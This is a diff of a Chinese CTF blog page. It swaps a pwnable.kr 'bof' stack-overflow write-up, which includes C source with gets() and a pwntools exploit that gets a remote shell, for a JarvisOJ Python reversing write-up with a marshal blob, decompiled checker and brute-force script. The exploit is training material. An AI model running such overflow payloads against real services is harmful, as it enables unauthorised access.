@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PWN学习之[Toddler&#39;s Bottle]-[bof] | Magician&#39;s blog</title>
+  <title>JarvisOJ-You Need Python wp | Magician&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="将bof和bof.c文件下载下来">
-<meta name="keywords" content="pwn">
+  <meta name="description" content="人生苦短我用Python。">
+<meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN学习之[Toddler&#39;s Bottle]-[bof]">
-<meta property="og:url" content="http://yoursite.com/2017/05/04/PWN学习之-Toddler-s-Bottle-bof/index.html">
+<meta property="og:title" content="JarvisOJ-You Need Python wp">
+<meta property="og:url" content="http://yoursite.com/2017/08/18/JarvisOJ-You-Need-Python-wp/index.html">
 <meta property="og:site_name" content="Magician&#39;s blog">
-<meta property="og:description" content="将bof和bof.c文件下载下来">
+<meta property="og:description" content="人生苦短我用Python。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-05-04T15:56:54.823Z">
+<meta property="og:updated_time" content="2017-08-18T13:29:51.665Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN学习之[Toddler&#39;s Bottle]-[bof]">
-<meta name="twitter:description" content="将bof和bof.c文件下载下来">
+<meta name="twitter:title" content="JarvisOJ-You Need Python wp">
+<meta name="twitter:description" content="人生苦短我用Python。">
   
     <link rel="alternative" href="/atom.xml" title="Magician&#39;s blog" type="application/atom+xml">
   
@@ -155,36 +155,40 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-PWN学习之-Toddler-s-Bottle-bof" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-JarvisOJ-You-Need-Python-wp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      PWN学习之[Toddler&#39;s Bottle]-[bof]
+      JarvisOJ-You Need Python wp
     </h1>
   
 
         
-        <a href="/2017/05/04/PWN学习之-Toddler-s-Bottle-bof/" class="archive-article-date">
-  	<time datetime="2017-05-05T06:55:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-04</time>
+        <a href="/2017/08/18/JarvisOJ-You-Need-Python-wp/" class="archive-article-date">
+  	<time datetime="2017-08-19T04:12:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>将bof和bof.c文件下载下来<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">void func(int key)&#123;</div><div class="line">	char overflowme[32];</div><div class="line">	printf(&quot;overflow me : &quot;);</div><div class="line">	gets(overflowme);	// smash me!</div><div class="line">	if(key == 0xcafebabe)&#123;</div><div class="line">		system(&quot;/bin/sh&quot;);</div><div class="line">	&#125;</div><div class="line">	else&#123;</div><div class="line">		printf(&quot;Nah..\n&quot;);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">int main(int argc, char* argv[])&#123;</div><div class="line">	func(0xdeadbeef);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>通过bof.c可以看到当key==0xcafebabe时获得shell，但是由于func函数传入的实参为0xdeadbeef，看起来不可能实现get shell</p>
-<p>但是我们注意到func函数通过gets函数获取overflowme的值，这就给了我们溢出的基础，通过溢出overflowme覆盖key的值从而使的key==0xcafebabe。</p>
-<p>查看func的汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">0x0000062c &lt;+0&gt;:	push   ebp</div><div class="line">  0x0000062d &lt;+1&gt;:	mov    ebp,esp</div><div class="line">  0x0000062f &lt;+3&gt;:	sub    esp,0x48</div><div class="line">  0x00000632 &lt;+6&gt;:	mov    eax,gs:0x14</div><div class="line">  0x00000638 &lt;+12&gt;:	mov    DWORD PTR [ebp-0xc],eax</div><div class="line">  0x0000063b &lt;+15&gt;:	xor    eax,eax</div><div class="line">  0x0000063d &lt;+17&gt;:	mov    DWORD PTR [esp],0x78c</div><div class="line">  0x00000644 &lt;+24&gt;:	call   0x645 &lt;func+25&gt;</div><div class="line">  0x00000649 &lt;+29&gt;:	lea    eax,[ebp-0x2c]  //[ebp-0x2c]为overflowme</div><div class="line">  0x0000064c &lt;+32&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">  0x0000064f &lt;+35&gt;:	call   0x650 &lt;func+36&gt;</div><div class="line">  0x00000654 &lt;+40&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe   //[ebp+0x8]为key</div><div class="line">  0x0000065b &lt;+47&gt;:	jne    0x66b &lt;func+63&gt;</div><div class="line">  0x0000065d &lt;+49&gt;:	mov    DWORD PTR [esp],0x79b</div><div class="line">  0x00000664 &lt;+56&gt;:	call   0x665 &lt;func+57&gt;</div><div class="line">  0x00000669 &lt;+61&gt;:	jmp    0x677 &lt;func+75&gt;</div><div class="line">  0x0000066b &lt;+63&gt;:	mov    DWORD PTR [esp],0x7a3</div><div class="line">  0x00000672 &lt;+70&gt;:	call   0x673 &lt;func+71&gt;</div><div class="line">  0x00000677 &lt;+75&gt;:	mov    eax,DWORD PTR [ebp-0xc]</div><div class="line">  0x0000067a &lt;+78&gt;:	xor    eax,DWORD PTR gs:0x14</div><div class="line">  0x00000681 &lt;+85&gt;:	je     0x688 &lt;func+92&gt;</div><div class="line">  0x00000683 &lt;+87&gt;:	call   0x684 &lt;func+88&gt;</div><div class="line">  0x00000688 &lt;+92&gt;:	leave  </div><div class="line">  0x00000689 &lt;+93&gt;:	ret</div></pre></td></tr></table></figure>
-<p>通过汇编代码我们可以看到，[ebp-0x2c]即为overflowme，[ebp+0x8]为key。所以我们只需要填充52个字节再加上0xcafebabe即可获得shell。</p>
-<p>因此我们的exp为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">payload=&apos;a&apos;*52+p32(0xcafebabe)</div><div class="line">#p=process(&quot;./bof&quot;)</div><div class="line">p=remote(&apos;pwnable.kr&apos;,9000)</div><div class="line">p.recvline()</div><div class="line">p.recvuntil(&quot;\n&quot;)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>再执行cat flag命令即可获取flag了。</p>
-<p>最后附上文件方便实践:<a href="http://pan.baidu.com/s/1slhjFvZ" target="_blank" rel="external">链接</a></p>
+        <p>人生苦短我用Python。<a id="more"></a> </p>
+<p>感谢：<br><a href="http://blog.csdn.net/cien_anos/article/details/70160614" target="_blank" rel="external">http://blog.csdn.net/cien_anos/article/details/70160614</a></p>
+<p>题目给了两个文件flag.py和key_is_here_but_do_you_know_rfc4042</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">marshal.loads(zlib.decompress(base64.b64decode(&apos;eJxtVP9r21YQvyd/ieWm66Cd03QM1B8C3pggUuzYCSWstHSFQijyoJBhhGq9OXJl2ZFeqAMOK6Q/94f9Ofvn1s+d7Lgtk/3O997du/vc584a0eqpYP2GVfwDEeOrKCU6g2LRRyiK4oooFsVVUSqkqxTX6J1F+SfSNYrrdKPorC76luhbpOEGCZNFZw2KG3Rmk26QtuXi3xTb7ND6/aVu0g2RuvhEcZNut5lAGbTvAFbyH57TkYLKy8J6xpDvQxiiiaIlcdqJxVcHbXY6bXNlZgviPCrO0+StqfKd88gzNh/qRZyMdWHE29TZZvIkG7eZFRGGRcBmsXJaUoKCQ9fWKHwSqNeKFnsM5PnwJ7q2aKk4AFhcWtQCh+ChB5+Lu/RmyYUxmtOEYxas7i/2iuR7Ti14OEOSmU0RADd4+dQzbM1FJhukAUeQ+kZROuLyioagrau76kc1slY1NNaY/y3LAxDQBrAICJisV2hMdF2lxQcyFuMoqcX3+TCl6xotqzSpkqmxYVmjXVjAXiwBsEfBrd1VvTvLCj2EXRnhoryAKdpxcIgJcowUB68yAx/tlCAuPHqDuZo0CN3CUGHwkPhGMA7aXMfphjbmQLhLhJcHa0a+mpgB191c1U1lnHJQbgkHx+WGxeJbejnpkzSavo2jkxZ7i725npGAaTc8FXmUjbUETHUmkxXN5zqL5WiWxwE7Bc11yyYzNJpN02jerq+DzNNodfxOX8kE4FcmYKscDdYD1oPGGucXYNmgs1F+NTf3GOt3Mg7b+NTVruqoQyX1hOEUacKw+AGbP38ZOq9THRXaSbL5pXGQ8bho/Z/lrzQaHxdoCrlev+t6nZ7re57r+57rHXag93Deh37k+vuw9zorO/Qj/B50cAf2oyOsvut3D+ADWxdxfN/1Drqu39mHzvcRswv/Hvz7sHeg9w8Qzy99DzuFwxhPhs6zWTbOI3OZRiaZZcVj5wVwOklx7OwVxR47PR46r/SVM8ulBJic9zku/eqY/MqJxiDj+Gd55wS3f35pbLCzHoEwzKKpDkN5i+TR+1AYCWTo5IV0Z0P9H3phDDd6lMzPdS5bbo9eJGbTsW9nbDqLL1N9Iq+rRxDbll2x67a9Lf27hw5uK1s1rZr6DOPF+FI=&apos;)))</div></pre></td></tr></table></figure>
+<p>查询可知zlib.decompress函数进行解压,marshal.loads函数是将数据流转为code object。<br>而code object是可以转化为pyc的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def pycodeobject2pyc(pyobj, pycfile):</div><div class="line">    with open(pycfile, &apos;wb&apos;) as fc: </div><div class="line">        fc.write(&apos;\0\0\0\0&apos;)</div><div class="line">        timestamp = long(os.fstat(fc.fileno()).st_mtime)</div><div class="line">        py_compile.wr_long(fc, timestamp)</div><div class="line">        marshal.dump(pyobj, fc)</div><div class="line">        fc.flush()</div><div class="line">        fc.seek(0, 0)</div><div class="line">        MAGIC = imp.get_magic()</div><div class="line">        fc.write(MAGIC)</div></pre></td></tr></table></figure>
+<p>通过python反编译工具我们可以得到源代码，我用的反编译工具为EasyPythonDecompiler，大家有兴趣尝试的可以下载反编译。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import hashlib</div><div class="line"></div><div class="line">def sha1(string):</div><div class="line">    return hashlib.sha1(string).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">def calc(strSHA1):</div><div class="line">    r = 0</div><div class="line">    for i in strSHA1:</div><div class="line">        r += int(&apos;0x%s&apos; % i, 16)</div><div class="line"></div><div class="line">    return r</div><div class="line"></div><div class="line"></div><div class="line">def encrypt(plain, key):</div><div class="line">    keySHA1 = sha1(key)</div><div class="line">    intSHA1 = calc(keySHA1)</div><div class="line">    r = []</div><div class="line">    for i in range(len(plain)):</div><div class="line">        r.append(ord(plain[i]) + int(&apos;0x%s&apos; % keySHA1[i % 40], 16) - intSHA1)</div><div class="line">        intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20])</div><div class="line"></div><div class="line">    return &apos;&apos;.join(map(lambda x: str(x), r))</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    key = raw_input(&apos;[*] Please input key:&apos;)</div><div class="line">    plain = raw_input(&apos;[*] Please input flag:&apos;)</div><div class="line">    encryptText = encrypt(plain, key)</div><div class="line">    cipherText = &apos;-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164&apos;</div><div class="line">    if encryptText == cipherText:</div><div class="line">        print &apos;[&gt;] Congratulations! Flag is: %s&apos; % plain</div><div class="line">        exit()</div><div class="line">    else:</div><div class="line">        print &apos;[!] Key or flag is wrong, try again:)&apos;</div><div class="line">        exit()</div></pre></td></tr></table></figure>
+<p>可以看到要求输入flag和key，然后进行验证。<br>看到key大家是不是感觉有点印象？没错，我们还有一个文件没有用到。<br>看到文件提示为rfc4042,查询可知为uft9解密。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___</div></pre></td></tr></table></figure>
+<p>解密后得到如上的结果..可以看到是由不同个数的”_“和四则运算符组成。我们假设’_‘的个数为数字便可以将上面的乱码看成一个运算式。<br>可以得到结果5287002131074331513。假如你以为这就是key，那么就是too young too simple了（咳咳，我是不会告诉你们我…）<br>将这串数字转化为字符串才是我们需要的key~</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">import utf9</div><div class="line">file=open(&apos;key_is_here&apos;,&apos;r&apos;)</div><div class="line">data=file.read()</div><div class="line">key=utf9.utf9decode(data)</div><div class="line">num=0</div><div class="line">ys=&apos;&apos;</div><div class="line">for c in key:</div><div class="line">	if c==&apos;_&apos;:</div><div class="line">		num+=1</div><div class="line">	else:</div><div class="line">		if num==0:</div><div class="line">			ys+=c</div><div class="line">		else:		</div><div class="line">			ys+=str(num)+c</div><div class="line">		num=0</div><div class="line">d=eval(ys+str(3))</div><div class="line">print d</div><div class="line">hexd=hex(d)[2:]</div><div class="line">print hexd</div><div class="line">key=&apos;&apos;</div><div class="line">for i in range(len(hexd)/2):</div><div class="line">    key += chr(eval(&apos;0x&apos;+hexd[2*i:2*i+2]))</div><div class="line"></div><div class="line">print key</div></pre></td></tr></table></figure>
+<p>知道了key爆破即可得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">import hashlib</div><div class="line"></div><div class="line">def sha1(string):</div><div class="line">    return hashlib.sha1(string).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">def calc(strSHA1):</div><div class="line">    r = 0</div><div class="line">    for i in strSHA1:</div><div class="line">        r += int(&apos;0x%s&apos; % i, 16)</div><div class="line"></div><div class="line">    return r</div><div class="line"></div><div class="line"></div><div class="line">def encrypt(plain, key):</div><div class="line">    keySHA1 = sha1(key)</div><div class="line">    intSHA1 = calc(keySHA1)</div><div class="line">    r = []</div><div class="line">    for i in range(len(plain)):</div><div class="line">        r.append(ord(plain[i]) + int(&apos;0x%s&apos; % keySHA1[i % 40], 16) - intSHA1)</div><div class="line">        intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20])</div><div class="line"></div><div class="line">    return &apos;&apos;.join(map(lambda x: str(x), r))</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    key = &apos;I_4m-k3y&apos;</div><div class="line">    plain=&apos;&apos;</div><div class="line">    flag=&apos;&apos;</div><div class="line">    cipherText = &apos;-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164&apos;</div><div class="line">    for i in range(len(cipherText)/4):</div><div class="line">        for j in range(128):</div><div class="line">            plain+=chr(j)</div><div class="line">            encryptText = encrypt(plain, key)</div><div class="line">    </div><div class="line">            if encryptText == cipherText[0:4*(i+1)]:</div><div class="line">                flag+=chr(j)</div><div class="line">                plain=flag</div><div class="line">                print &apos;[&gt;] Congratulations! Flag is: %s&apos; % plain</div><div class="line">            else:</div><div class="line">                plain=flag</div></pre></td></tr></table></figure>
 
       
 
@@ -219,7 +223,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		
 		</ul>
@@ -275,7 +279,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/05/04/PWN学习之-Toddler-s-Bottle-bof/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/08/18/JarvisOJ-You-Need-Python-wp/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -289,18 +293,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/05/08/PWN学习之-Rookiss-simple-login/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          PWN学习之[Rookiss]-[simple login]
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/05/03/PWN学习之-Toddler-s-Bottle-passcode/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">PWN学习之[Toddler&#39;s Bottle]-[passcode]</div>
+    <a href="/2017/05/09/PWN学习之-Rookiss-echo1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PWN学习之[Rookiss]-[echo1]</div>
       <i class="icon-circle-right"></i>
     </a>
   
